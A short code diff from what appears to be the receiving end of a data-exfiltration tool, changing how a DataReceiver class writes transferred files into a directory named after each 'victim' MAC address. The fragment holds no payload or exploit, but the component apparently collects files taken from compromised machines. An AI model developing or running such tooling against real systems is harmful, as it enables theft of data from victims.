@@ -103,7 +103,7 @@ class DataReceiver():
 
             # Write to file from buffer
             victim_dir = self.rel_path + str(victim_mac)
-            with open(victim_dir + '/files/' + filename, file_mode) as f:
+            with open(victim_dir + '/files/' + filename, 'wb+') as f:
                 buf = ''
                 print(self.file_transfer[key])
                 for packet in self.file_transfer[key]:
